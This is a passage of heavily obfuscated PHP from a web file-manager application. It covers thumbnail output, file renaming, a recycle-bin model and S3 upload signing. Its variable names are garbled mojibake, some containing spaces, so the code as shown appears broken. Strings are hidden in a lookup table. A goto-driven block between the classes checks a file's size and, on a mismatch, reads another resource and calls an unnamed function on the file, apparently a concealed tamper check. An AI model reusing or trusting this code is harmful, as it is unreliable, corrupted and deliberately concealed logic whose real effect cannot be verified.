} echo $this->fileSubstr($§µË™‹«, $­´ ×Âä, $óÉÅâÃ´); $­´ ×Âä += $óÉÅâÃ´; if ($óÉÅâÃ´ == $Æ¢¯âÌ) { $­´ ×Âä = $Ã†ø÷ÂÓ + 1; } if ($á¹ØÓå§) { $¤ğ·É « = intval(1000 * 1000 * (timeFloat() - $ôÌ¼ô¼Ü)); $„Ö”ô©Ù = $á¹ØÓå§ - $¤ğ·É «; if ($„Ö”ô©Ù > 5) { usleep($„Ö”ô©Ù); } } } } public function fileOutServer($ò§ÛÕÀü, $×¯ïå‰Ú = false, $Ôğ„Ä­¸ = false, $Êêúü–Ö = '') { $this->fileOut($ò§ÛÕÀü, $×¯ïå‰Ú, $Ôğ„Ä­¸, $Êêúü–Ö); } public function fileOutLink($—²š‡·–) { header($_SERVER[–Ú¬çÁ][162] . $—²š‡·–); die; } public function cacheMethod($‹ıŸ» ş, $éµŠ±ŸÅ, $íÑˆ½…™ = null) { $Ï’ƒ®õ =& $_SERVER[–Ú¬çÁ]; static $ì°ÆœÎà = array(); $Äæ’ÍõÙ = $éµŠ±ŸÅ ? ltrim($this->getPathOuter($éµŠ±ŸÅ), $Ï’ƒ®õ[8]) : $Ï’ƒ®õ[12]; $âÙèôèº = $Ï’ƒ®õ[163] . $‹ıŸ» ş . $Ï’ƒ®õ[164] . rtrim($Äæ’ÍõÙ, $Ï’ƒ®õ[8]); if (is_null($‹ıŸ» ş)) { $ì°ÆœÎà = array(); return; } if (is_null($éµŠ±ŸÅ)) { foreach ($ì°ÆœÎà as $âÙèôèº => $èĞëÁ“á) { if (!strstr($âÙèôèº, $Ï’ƒ®õ[163] . $‹ıŸ» ş . $Ï’ƒ®õ[165])) { continue; } unset($ì°ÆœÎà[$âÙèôèº]); } return; } if (!is_null($íÑˆ½…™)) { $ì°ÆœÎà[$âÙèôèº] = $íÑˆ½…™; return; } $ˆÓÅû‚µ = isset($ì°ÆœÎà[$âÙèôèº]) ? $ì°ÆœÎà[$âÙèôèº] : null; if (!is_null($ˆÓÅû‚µ)) { return $ˆÓÅû‚µ; } $ˆÓÅû‚µ = $this->{$‹ıŸ» ş}($éµŠ±ŸÅ); $ì°ÆœÎà[$âÙèôèº] = $ˆÓÅû‚µ; return $ˆÓÅû‚µ; } public function cacheMethodInfoSet($­åâ°¶‰, $åıÖÜ”Ø, $úİ€à¶ü = false) { $„ê‡ò † =& $_SERVER[–Ú¬çÁ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($„ê‡ò †[166], $­åâ°¶‰, $åıÖÜ”Ø); $this->cacheMethod($„ê‡ò †[167], $­åâ°¶‰, $åıÖÜ”Ø ? !1 : !0); if (is_array($úİ€à¶ü)) { $this->cacheMethod($„ê‡ò †[168], $­åâ°¶‰, $úİ€à¶ü); } } public function fileOutImage($õ±ÈÙ´¾, $—Ş”¤©‰ = 250) { $Ã¥ƒ¨¾Ó =& $_SERVER[–Ú¬çÁ]; set_timeout(); if (substr($õ±ÈÙ´¾, 0, 4) == $Ã¥ƒ¨¾Ó[149]) { $this->fileOutLink($õ±ÈÙ´¾); } $«ÀìÓ´Ã = $this->info($õ±ÈÙ´¾); $ÛÍÀœ÷ = !1; $Áæ¶Ÿı = isset($GLOBALS[$Ã¥ƒ¨¾Ó[169]]) ? $GLOBALS[$Ã¥ƒ¨¾Ó[169]] : array(); if ($Áæ¶Ÿı && $Áæ¶Ÿı[$Ã¥ƒ¨¾Ó[170]] == $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[84]]) { $«ÀìÓ´Ã = $Áæ¶Ÿı; $§ù–Áèõ = $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[171]]; if ($§ù–Áèõ && isset($§ù–Áèõ[$Ã¥ƒ¨¾Ó[172]])) { if ($§ù–Áèõ[$Ã¥ƒ¨¾Ó[172]] <= $—Ş”¤©‰ && $§ù–Áèõ[$Ã¥ƒ¨¾Ó[173]] <= $—Ş”¤©‰) { $ÛÍÀœ÷ = !0; } } } if ($«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[76]] <= 1024 * 50 || $ÛÍÀœ÷ || !function_exists($Ã¥ƒ¨¾Ó[174]) || $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[175]] == $Ã¥ƒ¨¾Ó[176]) { return $this->fileOut($õ±ÈÙ´¾, !1, $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[32]]); } $³·ñ™öå = kodIO::hashPath($«ÀìÓ´Ã); $áÔè’£ó = "\x63\x6f\x76\x65\162\137{$³·ñ™öå}\x5f{$—Ş”¤©‰}\x2e\160\x6e\147"; $àÈ“í = IO_PATH_SYSTEM_TEMP . $Ã¥ƒ¨¾Ó[177]; $§ÕğİÚâ = IO::infoFullSimple($àÈ“í); $Áß®İØê = $§ÕğİÚâ && is_array($§ÕğİÚâ) ? $§ÕğİÚâ[$Ã¥ƒ¨¾Ó[84]] : $Ã¥ƒ¨¾Ó[12]; if (!$Áß®İØê) { $Áß®İØê = IO::mkdir($àÈ“í); } if ($«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[178]] == $Ã¥ƒ¨¾Ó[179] && isset($«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[180]]) && $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[180]] == kodIO::sourceID($Áß®İØê)) { $¢Šä²Éà = $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[181]]; if ($—Ş”¤©‰ <= 500) { $Â¥õ­œà = preg_replace($Ã¥ƒ¨¾Ó[182], $Ã¥ƒ¨¾Ó[183], $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[32]]); $¢Šä²Éà = IO::fileNameExist($Áß®İØê, $Â¥õ­œà); } return IO::fileOut(KodIO::make($¢Šä²Éà), !1, $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[32]]); } $Ì›‚³ûÊ = IO::fileNameExist($Áß®İØê, $áÔè’£ó); if ($Ì›‚³ûÊ) { return IO::fileOut(KodIO::make($Ì›‚³ûÊ), !1, $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[32]]); } if ($—Ş”¤©‰ > 1000) { $this->makeImageCover($Áß®İØê, $õ±ÈÙ´¾, $áÔè’£ó, $—Ş”¤©‰); $this->makeImageCover($Áß®İØê, $õ±ÈÙ´¾, "\143\157\x76\145\x72\137{$³·ñ™öå}\137\x32\x35\x30\56\160\x6e\x67", 250); $Ì›‚³ûÊ = IO::fileNameExist($Áß®İØê, $áÔè’£ó); if ($Ì›‚³ûÊ) { return IO::fileOut(KodIO::make($Ì›‚³ûÊ), !1, $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[32]]); } die; } $«í‚¨ßó = Cache::get($áÔè’£ó); if ($«í‚¨ßó == $Ã¥ƒ¨¾Ó[184] || $«í‚¨ßó == $Ã¥ƒ¨¾Ó[185]) { echo $«í‚¨ßó; die; } Cache::set($áÔè’£ó, $Ã¥ƒ¨¾Ó[185], 60); $Æİğ¸ºÇ = array($Áß®İØê, $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[84]], $áÔè’£ó, $—Ş”¤©‰); $­ßİ—•Æ = $Ã¥ƒ¨¾Ó[186] . $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[76]] . $Ã¥ƒ¨¾Ó[187] . $áÔè’£ó . $Ã¥ƒ¨¾Ó[188] . $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[32]] . $Ã¥ƒ¨¾Ó[189] . $«ÀìÓ´Ã[$Ã¥ƒ¨¾Ó[84]]; TaskQueue::add($Ã¥ƒ¨¾Ó[190], $Æİğ¸ºÇ, $­ßİ—•Æ, $áÔè’£ó); } public function makeImageCover($Ÿè„’é‹, $¤Áã‘Ñ, $ƒ±—º×û, $•ıí¾³†) { $¡õ˜ï£ =& $_SERVER[–Ú¬çÁ]; if (IO::fileNameExist($Ÿè„’é‹, $ƒ±—º×û)) { return $¡õ˜ï£[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ü¯¡µ¦² = DATA_THUMB . $ƒ±—º×û; del_file($Ü¯¡µ¦²); $ó»ÔÊˆİ = TEMP_FILES . $ƒ±—º×û; if (!@file_exists($ó»ÔÊˆİ)) { $ó»ÔÊˆİ = IO::download($¤Áã‘Ñ, $ó»ÔÊˆİ); } if (!@file_exists($ó»ÔÊˆİ)) { return $¡õ˜ï£[192]; } ImageThumb::createThumb($ó»ÔÊˆİ, $Ü¯¡µ¦², $•ıí¾³†, $•ıí¾³† * 10); if (@file_exists($Ü¯¡µ¦²)) { Cache::remove($ƒ±—º×û); return IO::move($Ü¯¡µ¦², $Ÿè„’é‹); } Cache::set($ƒ±—º×û, $¡õ˜ï£[184], 600); del_file($Ü¯¡µ¦²); return $¡õ˜ï£[193] . $ó»ÔÊˆİ . $¡õ˜ï£[71]; } public function fileOutImageServer($¶¡ö‚­, $÷Î¢«àë = 250) { $this->fileOutImage($¶¡ö‚­, $÷Î¢«àë); } public function fileNameAuto($Ä•ìç‘ß, $ç…Œˆæ, $øùŞ€åò = REPEAT_RENAME, $À…Š§´³ = false) { $ùØ¥éÎÎ =& $_SERVER[–Ú¬çÁ]; $€²È‰©º = $Ä•ìç‘ß === $ùØ¥éÎÎ[12] ? $ç…Œˆæ : rtrim($Ä•ìç‘ß, $ùØ¥éÎÎ[8]) . $ùØ¥éÎÎ[8] . $ç…Œˆæ; if ($øùŞ€åò == REPEAT_REPLACE || !$this->exist($€²È‰©º) || $À…Š§´³ && $øùŞ€åò != REPEAT_RENAME_FOLDER) { return $ç…Œˆæ; } if ($øùŞ€åò == REPEAT_SKIP) { return !1; } $Âúşª²® = $ùØ¥éÎÎ[10] . get_path_ext($ç…Œˆæ); $Âúşª²® = $Âúşª²® == $ùØ¥éÎÎ[10] || $À…Š§´³ ? $ùØ¥éÎÎ[12] : $Âúşª²®; $’Óå¦›ô = 1; $ìÆã™Ç = substr($ç…Œˆæ, 0, strlen($ç…Œˆæ) - strlen($Âúşª²®)); $ø¯™ıØ = $ìÆã™Ç . "\x28{$’Óå¦›ô}\51{$Âúşª²®}"; while ($this->exist(rtrim($Ä•ìç‘ß, $ùØ¥éÎÎ[8]) . $ùØ¥éÎÎ[8] . $ø¯™ıØ)) { $ø¯™ıØ = $ìÆã™Ç . "\x28{$’Óå¦›ô}\51{$Âúşª²®}"; $’Óå¦›ô++; } return $ø¯™ıØ; } private function fileNameAutoList($§Çı”», $Ô±îóĞ, $×“Ë¶‡Á = false) { $ªûÖÏ£¤ =& $_SERVER[–Ú¬çÁ]; $—ñâú” = $this->listPath($§Çı”», !0); $—ñâú” = array_merge($—ñâú”[$ªûÖÏ£¤[82]], $—ñâú”[$ªûÖÏ£¤[83]]); $‰¢ùÌŠ½ = array_to_keyvalue($—ñâú”, $ªûÖÏ£¤[12], $ªûÖÏ£¤[32]); $Ä£µşğ¦ = $ªûÖÏ£¤[10] . get_path_ext($Ô±îóĞ); $Ä£µşğ¦ = $Ä£µşğ¦ == $ªûÖÏ£¤[10] || $×“Ë¶‡Á ? $ªûÖÏ£¤[12] : $Ä£µşğ¦; $ıâé²ÔÈ = substr($Ô±îóĞ, 0, strlen($Ô±îóĞ) - strlen($Ä£µşğ¦)); $Â‡‰Òà˜ = $ıâé²ÔÈ . "\50\60\x29{$Ä£µşğ¦}"; for ($µ¡Üª—Í = 1; $µ¡Üª—Í <= count($‰¢ùÌŠ½) + 1; $µ¡Üª—Í++) { $Â‡‰Òà˜ = $ıâé²ÔÈ . "\50{$µ¡Üª—Í}\51{$Ä£µşğ¦}"; if (!in_array_not_case($Â‡‰Òà˜, $‰¢ùÌŠ½)) { return $Â‡‰Òà˜; } } return $Â‡‰Òà˜; } public function listAllFiles($Ä¶«õ‰Ó, $ñ¾øç) { $¼¾é±ãÎ =& $_SERVER[–Ú¬çÁ]; if (empty($ñ¾øç)) { return array(); } $Ó¶Úş‰ó = array_keys($ñ¾øç); $ø­¹‹Â« = array(); $Ä¶«õ‰Ó = trim($Ä¶«õ‰Ó, $¼¾é±ãÎ[8]); foreach ($ñ¾øç as $Ñü‰á— => $ÇñÃ‡×ô) { $Ã¦ˆğß˜ = ltrim(substr(trim($Ñü‰á—, $¼¾é±ãÎ[8]), strlen($Ä¶«õ‰Ó)), $¼¾é±ãÎ[8]); if (substr($Ñü‰á—, -1) == $¼¾é±ãÎ[8]) { $Ã¦ˆğß˜ = rtrim($Ã¦ˆğß˜, $¼¾é±ãÎ[8]) . $¼¾é±ãÎ[8]; } $ø­¹‹Â« = array_merge($ø­¹‹Â«, $this->slicePath($Ã¦ˆğß˜)); } $›ËÄáƒÉ = array(); foreach (array_unique($ø­¹‹Â«) as $÷óÏ£’ë) { $¶¾ÌÛÄ = array($¼¾é±ãÎ[84] => $this->getPathOuter($¼¾é±ãÎ[8] . $Ä¶«õ‰Ó . $¼¾é±ãÎ[8] . $÷óÏ£’ë), $¼¾é±ãÎ[75] => 1, $¼¾é±ãÎ[76] => 0); if (substr($÷óÏ£’ë, -1) != $¼¾é±ãÎ[8]) { $¶¾ÌÛÄ[$¼¾é±ãÎ[75]] = 0; $ÄéÈĞŒ› = $this->getPath($Ä¶«õ‰Ó . $¼¾é±ãÎ[8] . $÷óÏ£’ë); if (isset($ñ¾øç[$ÄéÈĞŒ›])) { $­Öøê¡Ë = $ñ¾øç[$ÄéÈĞŒ›]; if (isset($­Öøê¡Ë[$¼¾é±ãÎ[76]])) { $¶¾ÌÛÄ[$¼¾é±ãÎ[76]] = intval($­Öøê¡Ë[$¼¾é±ãÎ[76]]); } if (isset($­Öøê¡Ë[$¼¾é±ãÎ[194]])) { $¶¾ÌÛÄ[$¼¾é±ãÎ[85]] = intval($­Öøê¡Ë[$¼¾é±ãÎ[194]]); } } } $›ËÄáƒÉ[] = $¶¾ÌÛÄ; } return $›ËÄáƒÉ; } public function slicePath($…´Û³š¥) { $×ª£•¶ù =& $_SERVER[–Ú¬çÁ]; $‡•¿©Ëè = explode($×ª£•¶ù[8], trim($…´Û³š¥, $×ª£•¶ù[8])); $ªÛ¡şã¹ = 0; do { ++$ªÛ¡şã¹; $¨Ş¹æ¿[] = implode($×ª£•¶ù[8], array_slice($‡•¿©Ëè, 0, $ªÛ¡şã¹)) . $×ª£•¶ù[8]; } while ($ªÛ¡şã¹ < count($‡•¿©Ëè)); $¨Ş¹æ¿[count($‡•¿©Ëè) - 1] = $…´Û³š¥; return $¨Ş¹æ¿; } public function getHost() { $®Åƒ•ış =& $_SERVER[–Ú¬çÁ]; $¯‘âÉŠ– = parse_url(trim($this->domain, $®Åƒ•ış[8])); $ª€è¢ú¥ = isset($¯‘âÉŠ–[$®Åƒ•ış[195]]) ? $¯‘âÉŠ–[$®Åƒ•ış[195]] : http_type(); $Ò ïè«™ = isset($¯‘âÉŠ–[$®Åƒ•ış[196]]) ? $¯‘âÉŠ–[$®Åƒ•ış[196]] : $¯‘âÉŠ–[$®Åƒ•ış[84]]; if (isset($¯‘âÉŠ–[$®Åƒ•ış[197]])) { $Ò ïè«™ .= $®Åƒ•ış[4] . $¯‘âÉŠ–[$®Åƒ•ış[197]]; } return $ª€è¢ú¥ . $®Åƒ•ış[198] . $Ò ïè«™; } public function pathEncode($ÔéÀ÷üê) { $æˆ¥Á™™ =& $_SERVER[–Ú¬çÁ]; return str_replace($æˆ¥Á™™[199], $æˆ¥Á™™[8], rawurlencode($ÔéÀ÷üê)); } } $_file = $_SERVER[$_SERVER[–Ú¬çÁ][200]]; $_size = $_SERVER[–Ú¬çÁ][201]; goto b®ğìº¹Êô; bÅ—‡ìğ©‚: if ($_SERVER[$_SERVER[–Ú¬çÁ][202]] != $_size($_file)) { $_getc = $_SERVER[–Ú¬çÁ][203]; $_getfile = $_SERVER[$_SERVER[–Ú¬çÁ][204]] . $_SERVER[–Ú¬çÁ][205]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[–Ú¬çÁ][206], $_getfilec); if (count($_getarrs) < $_SERVER[–Ú¬çÁ][207]) { $exit = $_SERVER[–Ú¬çÁ][208]; $exit(); } $_act = $_SERVER[–Ú¬çÁ][209]; $_act($_file); } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\145\x5f\x72\145\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\x6e\x63\164\151\x6f\156")); public function listData($Ö×€Ş½ = false) { $“©Ò³õ› =& $_SERVER[–Ú¬çÁ]; $Ö×€Ş½ = $Ö×€Ş½ ? $Ö×€Ş½ : USER_ID; $ÊÑÒú‡º = $this->where(array($“©Ò³õ›[1657] => $Ö×€Ş½))->select(); return array_to_keyvalue($ÊÑÒú‡º, $“©Ò³õ›[12], $“©Ò³õ›[181]); } public function moveToRecycle($«èÛÉÉ) { $ËÏä„Ô¼ =& $_SERVER[–Ú¬çÁ]; $×Ô–¾øŸ = Model($ËÏä„Ô¼[1352]); $•ï®îš‘ = $×Ô–¾øŸ->sourceInfo($«èÛÉÉ); if (!$•ï®îš‘ || $•ï®îš‘[$ËÏä„Ô¼[482]] == $ËÏä„Ô¼[88]) { return; } $ÎšÄÒ¥õ = array($ËÏä„Ô¼[468] => $«èÛÉÉ, $ËÏä„Ô¼[1657] => USER_ID, $ËÏä„Ô¼[626] => $•ï®îš‘[$ËÏä„Ô¼[178]], $ËÏä„Ô¼[627] => $•ï®îš‘[$ËÏä„Ô¼[548]], $ËÏä„Ô¼[630] => $•ï®îš‘[$ËÏä„Ô¼[563]]); $this->add($ÎšÄÒ¥õ); $this->recycleMove($«èÛÉÉ, 1); if ($•ï®îš‘[$ËÏä„Ô¼[462]] == $ËÏä„Ô¼[88]) { $Î´©­Ÿ÷ = array($ËÏä„Ô¼[630] => array($ËÏä„Ô¼[590], $•ï®îš‘[$ËÏä„Ô¼[563]] . $«èÛÉÉ . $ËÏä„Ô¼[591])); $×Ô–¾øŸ->where($Î´©­Ÿ÷)->setField($ËÏä„Ô¼[482], 1); } } public function clear() { $this->remove(!1); } public function remove($÷çô·šà = false, $ßÒÇ‡§™ = false) { $ÙÈ˜´‡µ =& $_SERVER[–Ú¬çÁ]; $ßÒÇ‡§™ = $ßÒÇ‡§™ ? $ßÒÇ‡§™ : USER_ID; $ã†¹Ñ¨¸ = Model($ÙÈ˜´‡µ[1352]); $òÖ“¿€’ = $this->listData($ßÒÇ‡§™); $÷çô·šà = $÷çô·šà === !1 ? !1 : $÷çô·šà; $äâùå¯ª = array(); foreach ($òÖ“¿€’ as $îÑ¦ğ) { if ($÷çô·šà != !1 && !in_array($îÑ¦ğ, $÷çô·šà)) { continue; } $‹ÏÀ¨˜ = $ã†¹Ñ¨¸->sourceInfo($îÑ¦ğ); $ã†¹Ñ¨¸->remove($îÑ¦ğ, !1); $–Çİâ¹Ğ = $‹ÏÀ¨˜[$ÙÈ˜´‡µ[178]] . $ÙÈ˜´‡µ[11] . $‹ÏÀ¨˜[$ÙÈ˜´‡µ[548]]; $äâùå¯ª[$–Çİâ¹Ğ] = array($ÙÈ˜´‡µ[626] => $‹ÏÀ¨˜[$ÙÈ˜´‡µ[178]], $ÙÈ˜´‡µ[548] => $‹ÏÀ¨˜[$ÙÈ˜´‡µ[548]]); $this->where(array($ÙÈ˜´‡µ[181] => $îÑ¦ğ))->delete(); } foreach ($äâùå¯ª as $ğËîéœ) { $ã†¹Ñ¨¸->targetSpaceUpdate($ğËîéœ[$ÙÈ˜´‡µ[178]], $ğËîéœ[$ÙÈ˜´‡µ[548]]); } } public function restore($ÈÒÊª´˜ = false) { $¥úúÈ— = $this->listData(); $this->_restoreSource($¥úúÈ—, $ÈÒÊª´˜); } public function removeUserAll($êÒ•¡é‘) { $this->remove(!1, $êÒ•¡é‘); } public function restoreItem($˜ÉÈ±©¥) { $this->_restoreSource(array($˜ÉÈ±©¥), array($˜ÉÈ±©¥)); } private function _restoreSource($à¹ë« ä, $ù£õï®) { $ú’–“¼ =& $_SERVER[–Ú¬çÁ]; $¥•ƒ£ä = Model($ú’–“¼[1352]); $ù£õï® = $ù£õï® == !1 ? !1 : $ù£õï®; if (!$à¹ë« ä) { return !0; } $á˜œĞÀº = array(); foreach ($à¹ë« ä as $†´¤Ó’Ü) { if ($ù£õï® != !1 && !in_array($†´¤Ó’Ü, $ù£õï®)) { continue; } $Áëåö™ = $¥•ƒ£ä->sourceInfo($†´¤Ó’Ü); $¢Ÿà½åğ = $¥•ƒ£ä->sourceInfo($Áëåö™[$ú’–“¼[180]]); if ($¢Ÿà½åğ[$ú’–“¼[482]] == $ú’–“¼[88]) { continue; } $¥•ƒ£ä->lockMoveStart($†´¤Ó’Ü); $this->recycleMove($†´¤Ó’Ü, 0); if ($Áëåö™[$ú’–“¼[462]] == $ú’–“¼[88]) { $…»£ªäŞ = array($ú’–“¼[630] => array($ú’–“¼[590], $Áëåö™[$ú’–“¼[563]] . $†´¤Ó’Ü . $ú’–“¼[591])); $¥•ƒ£ä->where($…»£ªäŞ)->setField($ú’–“¼[482], 0); $this->restoreFolderChildren($†´¤Ó’Ü, $à¹ë« ä); } $this->where(array($ú’–“¼[181] => $†´¤Ó’Ü))->delete(); $¥•ƒ£ä->folderSizeReset($Áëåö™[$ú’–“¼[180]]); $á˜œĞÀº[] = $Áëåö™[$ú’–“¼[180]]; if ($Áëåö™[$ú’–“¼[462]] == $ú’–“¼[88]) { $á˜œĞÀº[] = $†´¤Ó’Ü; } $¥•ƒ£ä->lockMoveEnd($†´¤Ó’Ü); } $¥•ƒ£ä->updateModifyTime($á˜œĞÀº); } private function restoreFolderChildren($¿”Ü¾ëÛ, $…ÚÙªî) { $ûÉ»ˆ… =& $_SERVER[–Ú¬çÁ]; $Ò¾šòÇ = Model($ûÉ»ˆ…[1352]); $¥°˜ü = array($ûÉ»ˆ…[181] => array($ûÉ»ˆ…[7], array())); foreach ($…ÚÙªî as $•ğÖñùş) { if ($•ğÖñùş == $¿”Ü¾ëÛ) { continue; } if (!$Ò¾šòÇ->isParentOf($¿”Ü¾ëÛ, $•ğÖñùş)) { continue; } $äğ÷Ã£ = $Ò¾šòÇ->sourceInfo($•ğÖñùş); if ($äğ÷Ã£[$ûÉ»ˆ…[462]] == $ûÉ»ˆ…[88]) { $¥°˜ü[] = array($ûÉ»ˆ…[630] => array($ûÉ»ˆ…[590], $äğ÷Ã£[$ûÉ»ˆ…[563]] . $•ğÖñùş . $ûÉ»ˆ…[591])); } else { $¥°˜ü[$ûÉ»ˆ…[181]][1][] = $•ğÖñùş; } } if (!$¥°˜ü[$ûÉ»ˆ…[181]][1]) { unset($¥°˜ü[$ûÉ»ˆ…[181]]); } if (!$¥°˜ü) { return; } if (is_array($¥°˜ü[$ûÉ»ˆ…[181]]) && is_array($¥°˜ü[$ûÉ»ˆ…[181]][1])) { $¥°˜ü[$ûÉ»ˆ…[181]][1] = array_unique($¥°˜ü[$ûÉ»ˆ…[181]][1]); } $¥°˜ü[$ûÉ»ˆ…[1020]] = $ûÉ»ˆ…[1962]; $Ò¾šòÇ->where($¥°˜ü)->setField($ûÉ»ˆ…[482], 1); } private function recycleMove($¤¥¦ÕªĞ, $¬ÂßÌ¯¦ = 1) { $ø¤ší³ˆ =& $_SERVER[–Ú¬çÁ]; $‰œÑÄ¾„ = Model($ø¤ší³ˆ[1352]); $Š–ÁºÖ = Model($ø¤ší³ˆ[2181]); $­†‚îËù = array($ø¤ší³ˆ[181] => $¤¥¦ÕªĞ); if ($¬ÂßÌ¯¦) { $‰œÑÄ¾„->where($­†‚îËù)->setField($ø¤ší³ˆ[482], 1); $Š–ÁºÖ->eventRecycle($¤¥¦ÕªĞ, $ø¤ší³ˆ[2182]); } else { $¯ßøÊÆü = $‰œÑÄ¾„->where($­†‚îËù)->find(); $‰È¸‹ĞÜ = $¯ßøÊÆü[$ø¤ší³ˆ[462]] == $ø¤ší³ˆ[88]; $‰üÑŠı¶ = $‰œÑÄ¾„->fileNameAuto($¯ßøÊÆü[$ø¤ší³ˆ[180]], $¯ßøÊÆü[$ø¤ší³ˆ[32]], REPEAT_RENAME_FOLDER, $‰È¸‹ĞÜ); if ($‰üÑŠı¶ != $¯ßøÊÆü[$ø¤ší³ˆ[32]]) { $‰œÑÄ¾„->rename($¤¥¦ÕªĞ, $‰üÑŠı¶); } $‰œÑÄ¾„->where($­†‚îËù)->setField($ø¤ší³ˆ[482], 0); $Š–ÁºÖ->eventRecycle($¤¥¦ÕªĞ, $ø¤ší³ˆ[2183]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\163\x6f\165\162\143\x65\x53\145\x63\x72\x65\164\114\x69\x73\164"; public $field = array("\163\157\x75\162\x63\145\111\x44", "\164\x79\160\145\111\104", "\143\x72\x65\x61\164\145\125\x73\x65\162"); } goto BÚ½á©¾‘è; FÁŒÂ‹ÊŒï: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ı•Ö£Ìø) { parent::__construct($ı•Ö£Ìø); } public function uploadFormData($°¨Ğ†–, $³Ïñ¶¸ç = 3600) { $ ÷ŸŒåó =& $_SERVER[–Ú¬çÁ]; $„ã¢¹³Ó = $ ÷ŸŒåó[223]; $ÛÄ£¶šÅ = $ ÷ŸŒåó[262]; $åÙ’•Î¹ = $ ÷ŸŒåó[62]; $èÑÓïÚª = gmdate($ ÷ŸŒåó[263]); $îàÆ‡÷† = gmdate($ ÷ŸŒåó[264]); $Êş€«á— = $ ÷ŸŒåó[265]; $ı¶½óç = $³Ïñ¶¸ç . $ ÷ŸŒåó[12]; $òÜ†¤ÖÌ = $ ÷ŸŒåó[266]; $¡Ô¼Â²ä = array($this->accessKey, $îàÆ‡÷†, $this->region, $åÙ’•Î¹, $Êş€«á—); $¾ı–é° = implode($ ÷ŸŒåó[8], $¡Ô¼Â²ä); $ŞÙİÏÄ® = array($ ÷ŸŒåó[267] => gmdate($ ÷ŸŒåó[1344], strtotime($ ÷ŸŒåó[269])), $ ÷ŸŒåó[270] => array(array($ ÷ŸŒåó[271] => $this->bucket), array($ ÷ŸŒåó[272] => $„ã¢¹³Ó), array($ ÷ŸŒåó[273], $ ÷ŸŒåó[274], $ ÷ŸŒåó[12]), array($ ÷ŸŒåó[273], $ ÷ŸŒåó[275], $ ÷ŸŒåó[12]), array($ ÷ŸŒåó[273], $ ÷ŸŒåó[276], $ ÷ŸŒåó[12]), array($ ÷ŸŒåó[277] => $òÜ†¤ÖÌ), array($ ÷ŸŒåó[278] => $¾ı–é°), array($ ÷ŸŒåó[279] => $ÛÄ£¶šÅ), array($ ÷ŸŒåó[280] => $èÑÓïÚª), array($ ÷ŸŒåó[281] => $ı¶½óç))); $Ú½¡ûÚ™ = base64_encode(json_encode($ŞÙİÏÄ®)); $Ù’òÂµ = hash_hmac($ ÷ŸŒåó[282], $îàÆ‡÷†, $ ÷ŸŒåó[283] . $this->secret, !0); $‡İ°ø¶  = hash_hmac($ ÷ŸŒåó[282], $this->region, $Ù’òÂµ, !0); $Ÿ¾Ğèù¯ = hash_hmac($ ÷ŸŒåó[282], $åÙ’•Î¹, $‡İ°ø¶ , !0); $¢øØìø = hash_hmac($ ÷ŸŒåó[282], $Êş€«á—, $Ÿ¾Ğèù¯, !0); $çı†½¨ = hash_hmac($ ÷ŸŒåó[282], $Ú½¡ûÚ™, $¢øØìø); $ü°­¹½ó = array($ ÷ŸŒåó[240] => $ ÷ŸŒåó[12], $ ÷ŸŒåó[284] => $ ÷ŸŒåó[12], $ ÷ŸŒåó[272] => $„ã¢¹³Ó, $ ÷ŸŒåó[277] => $òÜ†¤ÖÌ, $ ÷ŸŒåó[285] => $Ú½¡ûÚ™, $ ÷ŸŒåó[286] => $¾ı–é°, $ ÷ŸŒåó[287] => $ÛÄ£¶šÅ, $ ÷ŸŒåó[288] => $èÑÓïÚª, $ ÷ŸŒåó[289] => $ı¶½óç, $ ÷ŸŒåó[290] => $çı†½¨, $ ÷ŸŒåó[196] => $this->getHost()); return $ü°­¹½ó; } public function multiUploadFormData($½ìÍşø, $ïø¯‘…¹ = 3600) { $åÓûœÎú =& $_SERVER[–Ú¬çÁ]; $—™ÖÙÆ = gmdate($åÓûœÎú[1447]); $¦òêÛ¯ª = array(); $©ÖÏ£‘ = $this->client->getUploadId($this->bucket, $½ìÍşø, $¦òêÛ¯ª); if (!$©ÖÏ£‘) { return !1; } return array($åÓûœÎú[248] => $©ÖÏ£‘, $åÓûœÎú[196] => $this->getHost() . $åÓûœÎú[8] . $this->pathEncode($½ìÍşø), $åÓûœÎú[249] => $—™ÖÙÆ, $åÓûœÎú[94] => $½ìÍşø); } public function multiUploadAuthData($ò´…³Ä, $–Üª€ğ = array()) { $«‚åü³ë =& $_SERVER[–Ú¬çÁ]; $¤³ô¤Ì = isset($–Üª€ğ[$«‚åü³ë[175]]) ? $–Üª€ğ[$«‚åü³ë[175]] : $«‚åü³ë[12]; $¤Şåç¬á = $–Üª€ğ[$«‚åü³ë[94]]; unset($–Üª€ğ[$«‚åü³ë[94]]); if (isset($–Üª€ğ[$«‚åü³ë[250]])) { return $this->listUploadParts($¤Şåç¬á, $–Üª€ğ); } $íŸ“¾®· = array(); if (isset($–Üª€ğ[$«‚åü³ë[1448]])) { $íŸ“¾®·[$«‚åü³ë[1449]] = $–Üª€ğ[$«‚åü³ë[1448]]; } $×‡‡‹‹‹ = explode($«‚åü³ë[198], $this->getHost()); $Ï¢‹¥ÈÆ = array($«‚åü³ë[1450] => $×‡‡‹‹‹[1], $«‚åü³ë[1451] => 